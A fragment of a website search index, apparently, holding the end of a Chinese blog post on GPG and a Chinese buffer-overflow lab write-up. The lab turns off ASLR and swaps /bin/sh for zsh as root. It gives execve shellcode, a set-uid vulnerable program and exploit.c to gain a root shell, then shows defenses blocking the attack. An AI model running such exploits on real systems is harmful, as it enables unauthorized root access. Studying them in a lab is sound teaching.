TPM \u82af\u7247\uff0c\u5373\u4f7f\u4f5c\u4e3a\u786c\u4ef6\u7684 TPM \u82af\u7247\u88ab\u76d7\uff0c\u4ed6\u4eba\u4e5f\u65e0\u6cd5\u590d\u5236\u82af\u7247\u4e2d\u7684\u79c1\u94a5\u3002 TPM \u5176\u5b9e\u5b58\u5728\u4e0e\u5f88\u591a\u7b14\u8bb0\u672c\u548c\u624b\u673a\u4e2d\uff0ciPhone \u7684\u5b58\u50a8\u82af\u7247\u548c\u6307\u7eb9\u8bc6\u522b\u90fd\u662f\u4f9d\u8d56\u4e8e TPM \u5de5\u4f5c\u7684\u3002\u6211\u76ee\u524d\u5728\u4f7f\u7528\u662f\u7684\u4e00\u6b3e\u53eb Yubikey \u7684 USB TPM \u82af\u7247\uff0c\u5b83\u652f\u6301 GPG SmartCard \u7684\u6807\u51c6\uff0c\u53ef\u4ee5\u5c06 GPG \u7684\u5bc6\u94a5\u5b58\u50a8\u5728\u5176\u4e2d\u3002","title":"\u4fdd\u7ba1\u5bc6\u94a5"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#_5","text":"GPG \u53ef\u4ee5\u5728\u4e92\u8054\u7f51\u4e0a\uff0c\u4ee5\u6570\u5b66\u4e3a\u57fa\u7840\u521b\u9020\u4e00\u4e2a\u65e0\u6cd5\u88ab\u4f2a\u9020\u7684\u8eab\u4efd\uff0c\u5e76\u4ee5\u6b64\u8eab\u4efd\u7b7e\u540d\u4fe1\u606f\u3001\u63a5\u6536\u52a0\u5bc6\u4fe1\u606f\u3002 GPG \u4f7f\u7528\u53bb\u4e2d\u5fc3\u5316\u7684\u4fe1\u4efb\u6a21\u578b\uff0c\u9700\u8981\u81ea\u884c\u901a\u8fc7\u591a\u79cd\u6e20\u9053\u6765\u4ea4\u6362\u516c\u94a5\uff0c\u56e0\u6b64\u4e0d\u4f1a\u53d7\u5236\u4e8e\u5355\u4e00\u7684\u6743\u5a01\u673a\u6784\u3002 GPG \u63d0\u4f9b\u4e86\u8eab\u4efd\u7ba1\u7406\u548c\u76f8\u4e92\u8fdb\u884c\u300c\u4fe1\u4efb\u7b7e\u540d\u300d\u7684\u673a\u5236\u6765\u7b80\u5316\u5bc6\u94a5\u7684\u4ea4\u6362\u8fc7\u7a0b\u3002 GPG \u662f\u4e00\u4e2a\u5f00\u653e\u7684\u6807\u51c6\uff08\u517c\u5bb9\u5f88\u591a\u8f6f\u4ef6\u548c\u786c\u4ef6\uff09\uff0c\u6709\u7740\u6d3b\u8dc3\u7684\u793e\u533a\uff0c\u63d0\u4f9b\u4e86\u76f8\u5bf9\u6613\u7528\u7684\u5de5\u5177\u6765\u8fdb\u884c\u516c\u94a5\u52a0\u5bc6\u3001\u89e3\u5bc6\u3001\u7b7e\u540d\u3001\u9a8c\u7b7e\u3002 \u57fa\u4e8e\u516c\u94a5\u52a0\u5bc6\u5e76\u7b7e\u540d\u7684\u7aef\u5230\u7aef\u52a0\u5bc6\u662f\u4ece\u7406\u8bba\u4e0a\u4fdd\u8bc1\u901a\u8baf\u5b89\u5168\u7684\u552f\u4e00\u65b9\u6cd5\uff0c\u4f46\u5728\u6b64\u4e4b\u524d\u4f60\u9700\u8981\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\u6765\u4ea4\u6362\u516c\u94a5\u3002 \u5982\u679c\u79c1\u94a5\u4e22\u5931\u5c31\u53ea\u80fd\u6539\u5934\u6362\u9762\u3001\u91cd\u65b0\u505a\u4eba\u4e86\u3002","title":"\u5c0f\u7ed3"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#_6","text":"The beauty of asymmetric encryption - RSA crash course for developers Wikipedia: Comparison of instant messaging clients#Secure messengers The Keysigning Party HOWTO \uff08 \u7e41\u4f53\u4e2d\u6587 \uff09 iOS Security Guide Wikipedia: Shamir\u2019s Secret Sharing \u4e00\u4e2a\u5f00\u6e90\u5b9e\u73b0\uff1assss \u539f\u6587\u94fe\u63a5\uff1a https://jysperm.me/2017/09/gpg-and-e2ee/","title":"\u53c2\u8003\u6765\u6e90"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/","text":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u5b9e\u9a8c \u4e00\u3001\u5b9e\u9a8c\u539f\u7406 \u7f13\u51b2\u533a\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u8bd5\u56fe\u5411\u7f13\u51b2\u533a\u5199\u5165\u8d85\u51fa\u9884\u5206\u914d\u56fa\u5b9a\u957f\u5ea6\u6570\u636e\u7684\u60c5\u51b5\u3002\u8fd9\u4e00\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u6076\u610f\u7528\u6237\u5229\u7528\u6765\u6539\u53d8\u7a0b\u5e8f\u7684\u6d41\u63a7\u5236\uff0c\u751a\u81f3\u6267\u884c\u4ee3\u7801\u7684\u4efb\u610f\u7247\u6bb5\u3002\u8fd9\u4e00\u6f0f\u6d1e\u7684\u51fa\u73b0\u662f\u7531\u4e8e\u6570\u636e\u7f13\u51b2\u5668\u548c\u8fd4\u56de\u5730\u5740\u7684\u6682\u65f6\u5173\u95ed\uff0c\u6ea2\u51fa\u4f1a\u5f15\u8d77\u8fd4\u56de\u5730\u5740\u88ab\u91cd\u5199\u3002 \u7a0b\u5e8f\u6267\u884c\u6620\u50cf\u5982\u4e0b: \u4f4e\u5730\u5740 Code Data Heap Stack \u9ad8\u5730\u5740 \u8c03\u7528\u51fd\u6570\u65f6\u5806\u6808\u72b6\u6001\u5982\u4e0b: \u9ad8\u5730\u5740 \u53c2\u65702 \u53c2\u65701 PC FP \u5c40\u90e8\u53d8\u91cf1 \u5c40\u90e8\u53d8\u91cf2 .... \u4e34\u65f6\u7a7a\u95f4 \u4f4e\u5730\u5740 FP($ebp\u5185\u5bb9\uff09 SP($esp\u5185\u5bb9\uff09 \u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u501f\u52a9C\u8bed\u8a00\u5e93\u51fd\u6570strcpy()\u6ca1\u6709\u8fb9\u754c\u68c0\u67e5\u7684\u6f0f\u6d1e\uff0c\u5c06\u5b58\u50a8\u653b\u51fb\u4ee3\u7801\u7684\u5185\u5b58\u5730\u5740\u8986\u76d6\u6389PC\u7684\u5730\u5740\uff0c\u4ece\u800c\u4f7f\u8c03\u7528\u8fc7\u7a0b\u7ed3\u675f\u65f6\u8fd4\u56de\u5230\u653b\u51fb\u4ee3\u7801(shell code)\u7684\u5b58\u50a8\u5730\u5740\u4f7f\u653b\u51fb\u4ee3\u7801\u88ab\u6267\u884c\u3002 \u4e8c\u3001\u5b9e\u9a8c\u73af\u5883 \u4f18\u9e92\u9e9f 5.10 64\u4f4d(ubuntu 20.04.2 LTS x64) \u4e09\u3001\u5b9e\u9a8c\u51c6\u5907 \u5b9e\u9a8c\u73af\u5883\u7684\u662f 64 \u4f4d Ubuntu linux\uff0c\u800c\u672c\u6b21\u5b9e\u9a8c\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\u6c47\u7f16\u8bed\u53e5\uff0c\u6211\u4eec\u9700\u8981\u5728 32 \u4f4d\u73af\u5883\u4e0b\u4f5c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5b9e\u9a8c\u4e4b\u524d\u9700\u8981\u505a\u4e00\u4e9b\u51c6\u5907\u3002 sudo apt-get update sudo apt-get install -y lib32z1 libc6-dev-i386 lib32readline6-dev sudo apt-get install gdb \u56db\u3001\u5b9e\u9a8c\u8fc7\u7a0b 1\u3001\u521d\u59cb\u8bbe\u7f6e Ubuntu \u548c\u5176\u4ed6\u4e00\u4e9b Linux \u7cfb\u7edf\u4e2d\uff0c\u4f7f\u7528\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u6765\u968f\u673a\u5806\uff08heap\uff09\u548c\u6808\uff08stack\uff09\u7684\u521d\u59cb\u5730\u5740\uff0c\u8fd9\u4f7f\u5f97\u731c\u6d4b\u51c6\u786e\u7684\u5185\u5b58\u5730\u5740\u53d8\u5f97\u5341\u5206\u56f0\u96be\uff0c\u800c\u731c\u6d4b\u5185\u5b58\u5730\u5740\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u7684\u5173\u952e\u3002\u56e0\u6b64\u672c\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5173\u95ed\u8fd9\u4e00\u529f\u80fd\uff1a sudo sysctl -w kernel.randomize_va_space=0 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u9632\u8303\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u53ca\u5176\u5b83\u5229\u7528 shell \u7a0b\u5e8f\u7684\u653b\u51fb\uff0c\u8bb8\u591ashell\u7a0b\u5e8f\u5728\u88ab\u8c03\u7528\u65f6\u81ea\u52a8\u653e\u5f03\u5b83\u4eec\u7684\u7279\u6743\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u4f60\u80fd\u6b3a\u9a97\u4e00\u4e2a Set-UID \u7a0b\u5e8f\u8c03\u7528\u4e00\u4e2a shell\uff0c\u4e5f\u4e0d\u80fd\u5728\u8fd9\u4e2a shell \u4e2d\u4fdd\u6301 root \u6743\u9650\uff0c\u8fd9\u4e2a\u9632\u62a4\u63aa\u65bd\u5728 /bin/bash \u4e2d\u5b9e\u73b0\u3002linux\u4e2d\uff0c/bin/sh\u5b9e\u9645\u662f\u6307\u5411 /bin/bash \u6216 /bin/dash\u7684\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u3002\u4e3a\u4e86\u91cd\u73b0\u8fd9\u4e00\u9632\u62a4\u63aa\u65bd\u88ab\u5b9e\u73b0\u4e4b\u524d\u7684\u60c5\u5f62\uff0c\u6211\u4eec\u4f7f\u7528\u53e6\u4e00\u4e2a shell \u7a0b\u5e8f\uff08zsh\uff09\u4ee3\u66ff /bin/bash\u3002\u4e0b\u9762\u7684\u6307\u4ee4\u63cf\u8ff0\u4e86\u5982\u4f55\u8bbe\u7f6e zsh \u7a0b\u5e8f\uff1a sudo su cd /bin rm sh ln -s zsh sh exit 2\u3001shellcode \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u4f1a\u9020\u6210\u7a0b\u5e8f\u5d29\u6e83\uff0c\u5728\u7a0b\u5e8f\u4e2d\uff0c\u6ea2\u51fa\u7684\u6570\u636e\u8986\u76d6\u4e86\u8fd4\u56de\u5730\u5740\u3002\u800c\u5982\u679c\u8986\u76d6\u8fd4\u56de\u5730\u5740\u7684\u6570\u636e\u662f\u53e6\u4e00\u4e2a\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u8df3\u8f6c\u5230\u8be5\u5730\u5740\uff0c\u5982\u679c\u8be5\u5730\u5740\u5b58\u653e\u7684\u662f\u4e00\u6bb5\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u4ee3\u7801\u7528\u4e8e\u5b9e\u73b0\u5176\u4ed6\u529f\u80fd\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5c31\u662f shellcode \u89c2\u5bdf\u4ee5\u4e0b\u4ee3\u7801\uff1a #include <stdio.h> int main() { char *name[2]; name[0] = \"/bin/sh\"; name[1] = NULL; execve(name[0], name, NULL); } \u672c\u6b21\u5b9e\u9a8c\u7684 shellcode\uff0c\u5c31\u662f\u521a\u624d\u4ee3\u7801\u7684\u6c47\u7f16\u7248\u672c\uff1a \\x31\\xc0\\x50\\x68\"//sh\"\\x68\"/bin\"\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80 3\u3001\u6f0f\u6d1e\u7a0b\u5e8f #include <stdlib.h> #include <stdio.h> #include <string.h> int bof(char *str) { char buffer[12]; strcpy(buffer, str); return 1; } int main(int argc, char *argv[]) { char str[517]; FILE *badfile; badfile = fopen(\"badfile\", \"r\"); fread(str, sizeof(char),517, badfile); bof(str); printf(\"Return Properly\\n\"); return 1; } \u8be5\u7a0b\u5e8f\u4f1a\u8bfb\u53d6\u4e00\u4e2a\u540d\u4e3a\u201cbadfile\u201d\u7684\u6587\u4ef6\uff0c\u5e76\u5c06\u6587\u4ef6\u5185\u5bb9\u88c5\u5165\u201cbuffer\u201d\u3002 \u8f93\u5165\u547d\u4ee4 linux32 ,\u8fdb\u516532\u4f4d\u73af\u5883 \u7f16\u8bd1\u8be5\u7a0b\u5e8f\uff0c\u5e76\u8bbe\u7f6e SET-UID sudo gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c sudo chmod u+s stack GCC\u7f16\u8bd1\u5668\u6709\u4e00\u79cd\u6808\u4fdd\u62a4\u673a\u5236\u6765\u963b\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u7f16\u8bd1\u4ee3\u7801\u65f6\u9700\u8981\u7528 \u2013fno-stack-protector \u5173\u95ed\u8fd9\u79cd\u673a\u5236\u3002 \u800c -z execstack \u7528\u4e8e\u5141\u8bb8\u6267\u884c\u6808\u3002 -g \u53c2\u6570\u662f\u4e3a\u4e86\u4f7f\u7f16\u8bd1\u540e\u5f97\u5230\u7684\u53ef\u6267\u884c\u6587\u6863\u80fd\u7528 gdb \u8c03\u8bd5\u3002 4\u3001\u653b\u51fb\u7a0b\u5e8f /* exploit.c */ /* A program that creates a file containing code for launching shell*/ #include <stdlib.h> #include <stdio.h> #include <string.h> char shellcode[] = \"\\x31\\xc0\" //xorl %eax,%eax \"\\x50\" //pushl %eax \"\\x68\"\"//sh\" //pushl $0x68732f2f \"\\x68\"\"/bin\" //pushl $0x6e69622f \"\\x89\\xe3\" //movl %esp,%ebx \"\\x50\" //pushl %eax \"\\x53\" //pushl %ebx \"\\x89\\xe1\" //movl %esp,%ecx \"\\x99\" //cdq \"\\xb0\\x0b\" //movb $0x0b,%al \"\\xcd\\x80\" //int $0x80 ; void main(int argc, char **argv) { char buffer[517]; FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */ memset(&buffer, 0x90, 517); /* You need to fill the buffer with appropriate contents here */ strcpy(buffer,\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x??\\x??\\x??\\x??\"); //\u5728buffer\u7279\u5b9a\u504f\u79fb\u5904\u8d77\u59cb\u7684\u56db\u4e2a\u5b57\u8282\u8986\u76d6sellcode\u5730\u5740 strcpy(buffer + 100, shellcode); //\u5c06shellcode\u62f7\u8d1d\u81f3buffer\uff0c\u504f\u79fb\u91cf\u8bbe\u4e3a\u4e86 100 /* Save the contents to the file \"badfile\" */ badfile = fopen(\"./badfile\", \"w\"); fwrite(buffer, 517, 1, badfile); fclose(badfile); } \u6ce8\u610f\u4e0a\u9762\u7684\u4ee3\u7801\uff0c \\x??\\x??\\x??\\x?? \u5904\u9700\u8981\u6dfb\u4e0a shellcode \u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u56e0\u4e3a\u53d1\u751f\u6ea2\u51fa\u540e\u8fd9\u4e2a\u4f4d\u7f6e\u521a\u597d\u53ef\u4ee5\u8986\u76d6\u8fd4\u56de( PC )\u5730\u5740\u3002\u800c strcpy(buffer+100,shellcode); \u8fd9\u4e00\u53e5\u53c8\u544a\u8bc9\u6211\u4eec\uff0c shellcode \u4fdd\u5b58\u5728 buffer + 100 \u7684\u4f4d\u7f6e\u3002 \u73b0\u5728\u6211\u4eec\u8981\u5f97\u5230 shellcode \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u8f93\u5165\u547d\u4ee4\u8fdb\u5165 gdb \u8c03\u8bd5\uff1a gdb stack r disass main \u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a * <+19> \u6267\u884c\u540e\u7684(esp \u503c\u5c31\u662f str \u7684\u8d77\u59cb\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u5730\u5740 0x56556279 \u5904\u8bbe\u7f6e\u65ad\u70b9\uff0c\u4ee5\u83b7\u5f97 <+19> \u6267\u884c\u540e\u7684)esp\u503c\u3002 b *0x56556279 r i r $esp \u6700\u540e\u83b7\u5f97\u7684$esp\u503c 0xffffd2a0 \u5c31\u662f str \u7684\u5730\u5740\u3002 \u6839\u636e\u8bed\u53e5 strcpy(buffer + 100,shellcode); \u6211\u4eec\u8ba1\u7b97 shellcode \u7684\u5730\u5740\u4e3a 0xffffd2a0 + 0x64 = 0xffffd304 \u4fee\u6539 exploit.c \u6587\u4ef6\uff0c\u5c06 \\x??\\x??\\x??\\x?? \u4fee\u6539\u4e3a\u8ba1\u7b97\u7ed3\u679c \\x04\\xd3\\xff\\xff \uff0c\u56e0\u4e3a strcpy() \u5728\u5806\u6808\u4e2d\u662f\u4ece\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u590d\u5236\u6240\u4ee5\u662f\u4ee5\u53cd\u5e8f\u586b\u5165\u3002 5\u3001\u653b\u51fb\u7ed3\u679c \u7f16\u8bd1 exploit.c \u7a0b\u5e8f\uff0c\u5e76\u4f9d\u6b21\u8fd0\u884c exploit \u4e0e stack * \u53ef\u89c1\u901a\u8fc7\u653b\u51fb\u83b7\u5f97\u4e86root\u6743\u9650 \u4e94\u3001\u7ec3\u4e60 1\u3001\u901a\u8fc7\u547d\u4ee4 sudo sysctl -w kernel.randomize_va_space=2 \u6253\u5f00\u7cfb\u7edf\u7684\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u673a\u5236\uff0c\u91cd\u590d\u7528 exploit \u7a0b\u5e8f\u653b\u51fb stack \u7a0b\u5e8f\uff0c\u89c2\u5bdf\u80fd\u5426\u653b\u51fb\u6210\u529f\uff0c\u80fd\u5426\u83b7\u5f97root\u6743\u9650 \u3002 \u53ef\u89c1\u968f\u7740\u7cfb\u7edf\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u673a\u5236\u6253\u5f00\uff0c\u65e0\u6cd5\u8ba1\u7b97\u51fa PC \u6240\u5b58\u50a8\u5728\u5806\u6808\u4e2d\u7684\u5730\u5740\uff0c\u6240\u4ee5\u653b\u51fb\u5931\u8d25\u3002 2\u3001\u5c06 /bin/sh \u91cd\u65b0\u6307\u5411 /bin/bash \uff08\u6216 /bin/dash \uff09\uff0c\u89c2\u5bdf\u80fd\u5426\u653b\u51fb\u6210\u529f\uff0c\u80fd\u5426\u83b7\u5f97 root \u6743\u9650\u3002 \u53ef\u89c1/bin/bash shell\u53ef\u4ee5\u9632\u6b62\u81ea\u8eab\u5728set-uid\u8fdb\u7a0b\u4e2d\u6267\u884c\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u6267\u884c\u5219\u4f1a\u5c06\u7a0b\u5e8f\u7528\u6237ID\u66f4\u6539\u4e3a\u771f\u5b9e\u7528\u6237ID\uff0c\u5220\u9664\u7279\u6743\uff0c\u6240\u4ee5\u653b\u51fb\u5931\u8d25\u3002 \u53c2\u8003\u7f51\u5740: https://www.shiyanlou.com/courses/231 \u539f\u6587\u94fe\u63a5\uff1a https://www.cnblogs.com/WANGYUHAN/p/15474802.html","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u5b9e\u9a8c"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#_1","text":"","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u5b9e\u9a8c"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#_2","text":"\u7f13\u51b2\u533a\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u8bd5\u56fe\u5411\u7f13\u51b2\u533a\u5199\u5165\u8d85\u51fa\u9884\u5206\u914d\u56fa\u5b9a\u957f\u5ea6\u6570\u636e\u7684\u60c5\u51b5\u3002\u8fd9\u4e00\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u6076\u610f\u7528\u6237\u5229\u7528\u6765\u6539\u53d8\u7a0b\u5e8f\u7684\u6d41\u63a7\u5236\uff0c\u751a\u81f3\u6267\u884c\u4ee3\u7801\u7684\u4efb\u610f\u7247\u6bb5\u3002\u8fd9\u4e00\u6f0f\u6d1e\u7684\u51fa\u73b0\u662f\u7531\u4e8e\u6570\u636e\u7f13\u51b2\u5668\u548c\u8fd4\u56de\u5730\u5740\u7684\u6682\u65f6\u5173\u95ed\uff0c\u6ea2\u51fa\u4f1a\u5f15\u8d77\u8fd4\u56de\u5730\u5740\u88ab\u91cd\u5199\u3002 \u7a0b\u5e8f\u6267\u884c\u6620\u50cf\u5982\u4e0b: \u4f4e\u5730\u5740 Code Data Heap Stack \u9ad8\u5730\u5740 \u8c03\u7528\u51fd\u6570\u65f6\u5806\u6808\u72b6\u6001\u5982\u4e0b: \u9ad8\u5730\u5740 \u53c2\u65702 \u53c2\u65701 PC FP \u5c40\u90e8\u53d8\u91cf1 \u5c40\u90e8\u53d8\u91cf2 .... \u4e34\u65f6\u7a7a\u95f4 \u4f4e\u5730\u5740 FP($ebp\u5185\u5bb9\uff09 SP($esp\u5185\u5bb9\uff09 \u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u501f\u52a9C\u8bed\u8a00\u5e93\u51fd\u6570strcpy()\u6ca1\u6709\u8fb9\u754c\u68c0\u67e5\u7684\u6f0f\u6d1e\uff0c\u5c06\u5b58\u50a8\u653b\u51fb\u4ee3\u7801\u7684\u5185\u5b58\u5730\u5740\u8986\u76d6\u6389PC\u7684\u5730\u5740\uff0c\u4ece\u800c\u4f7f\u8c03\u7528\u8fc7\u7a0b\u7ed3\u675f\u65f6\u8fd4\u56de\u5230\u653b\u51fb\u4ee3\u7801(shell code)\u7684\u5b58\u50a8\u5730\u5740\u4f7f\u653b\u51fb\u4ee3\u7801\u88ab\u6267\u884c\u3002","title":"\u4e00\u3001\u5b9e\u9a8c\u539f\u7406"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#_3","text":"\u4f18\u9e92\u9e9f 5.10 64\u4f4d(ubuntu 20.04.2 LTS x64)","title":"\u4e8c\u3001\u5b9e\u9a8c\u73af\u5883"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#_4","text":"\u5b9e\u9a8c\u73af\u5883\u7684\u662f 64 \u4f4d Ubuntu linux\uff0c\u800c\u672c\u6b21\u5b9e\u9a8c\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\u6c47\u7f16\u8bed\u53e5\uff0c\u6211\u4eec\u9700\u8981\u5728 32 \u4f4d\u73af\u5883\u4e0b\u4f5c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5b9e\u9a8c\u4e4b\u524d\u9700\u8981\u505a\u4e00\u4e9b\u51c6\u5907\u3002 sudo apt-get update sudo apt-get install -y lib32z1 libc6-dev-i386 lib32readline6-dev sudo apt-get install gdb","title":"\u4e09\u3001\u5b9e\u9a8c\u51c6\u5907"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#_5","text":"","title":"\u56db\u3001\u5b9e\u9a8c\u8fc7\u7a0b"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#1","text":"Ubuntu \u548c\u5176\u4ed6\u4e00\u4e9b Linux \u7cfb\u7edf\u4e2d\uff0c\u4f7f\u7528\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u6765\u968f\u673a\u5806\uff08heap\uff09\u548c\u6808\uff08stack\uff09\u7684\u521d\u59cb\u5730\u5740\uff0c\u8fd9\u4f7f\u5f97\u731c\u6d4b\u51c6\u786e\u7684\u5185\u5b58\u5730\u5740\u53d8\u5f97\u5341\u5206\u56f0\u96be\uff0c\u800c\u731c\u6d4b\u5185\u5b58\u5730\u5740\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u7684\u5173\u952e\u3002\u56e0\u6b64\u672c\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5173\u95ed\u8fd9\u4e00\u529f\u80fd\uff1a sudo sysctl -w kernel.randomize_va_space=0 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u9632\u8303\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u53ca\u5176\u5b83\u5229\u7528 shell \u7a0b\u5e8f\u7684\u653b\u51fb\uff0c\u8bb8\u591ashell\u7a0b\u5e8f\u5728\u88ab\u8c03\u7528\u65f6\u81ea\u52a8\u653e\u5f03\u5b83\u4eec\u7684\u7279\u6743\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u4f60\u80fd\u6b3a\u9a97\u4e00\u4e2a Set-UID \u7a0b\u5e8f\u8c03\u7528\u4e00\u4e2a shell\uff0c\u4e5f\u4e0d\u80fd\u5728\u8fd9\u4e2a shell \u4e2d\u4fdd\u6301 root \u6743\u9650\uff0c\u8fd9\u4e2a\u9632\u62a4\u63aa\u65bd\u5728 /bin/bash \u4e2d\u5b9e\u73b0\u3002linux\u4e2d\uff0c/bin/sh\u5b9e\u9645\u662f\u6307\u5411 /bin/bash \u6216 /bin/dash\u7684\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u3002\u4e3a\u4e86\u91cd\u73b0\u8fd9\u4e00\u9632\u62a4\u63aa\u65bd\u88ab\u5b9e\u73b0\u4e4b\u524d\u7684\u60c5\u5f62\uff0c\u6211\u4eec\u4f7f\u7528\u53e6\u4e00\u4e2a shell \u7a0b\u5e8f\uff08zsh\uff09\u4ee3\u66ff /bin/bash\u3002\u4e0b\u9762\u7684\u6307\u4ee4\u63cf\u8ff0\u4e86\u5982\u4f55\u8bbe\u7f6e zsh \u7a0b\u5e8f\uff1a sudo su cd /bin rm sh ln -s zsh sh exit","title":"1\u3001\u521d\u59cb\u8bbe\u7f6e"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#2shellcode","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u4f1a\u9020\u6210\u7a0b\u5e8f\u5d29\u6e83\uff0c\u5728\u7a0b\u5e8f\u4e2d\uff0c\u6ea2\u51fa\u7684\u6570\u636e\u8986\u76d6\u4e86\u8fd4\u56de\u5730\u5740\u3002\u800c\u5982\u679c\u8986\u76d6\u8fd4\u56de\u5730\u5740\u7684\u6570\u636e\u662f\u53e6\u4e00\u4e2a\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u8df3\u8f6c\u5230\u8be5\u5730\u5740\uff0c\u5982\u679c\u8be5\u5730\u5740\u5b58\u653e\u7684\u662f\u4e00\u6bb5\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u4ee3\u7801\u7528\u4e8e\u5b9e\u73b0\u5176\u4ed6\u529f\u80fd\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5c31\u662f shellcode \u89c2\u5bdf\u4ee5\u4e0b\u4ee3\u7801\uff1a #include <stdio.h> int main() { char *name[2]; name[0] = \"/bin/sh\"; name[1] = NULL; execve(name[0], name, NULL); } \u672c\u6b21\u5b9e\u9a8c\u7684 shellcode\uff0c\u5c31\u662f\u521a\u624d\u4ee3\u7801\u7684\u6c47\u7f16\u7248\u672c\uff1a \\x31\\xc0\\x50\\x68\"//sh\"\\x68\"/bin\"\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80","title":"2\u3001shellcode"},{"location":"other/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#3","text":"#include <stdlib.h> #include <stdio.h> #include <string.h> int bof(char *str) { char buffer[12]; strcpy(buffer, str); return 1; } int main(int argc, char *argv[]) { char str[517]; FILE *badfile; badfile = fopen(\"badfile\", \"r\"); fread(str, sizeof(char),517, badfile); bof(str); printf(\"Return Properly\\n\"); return 1; } 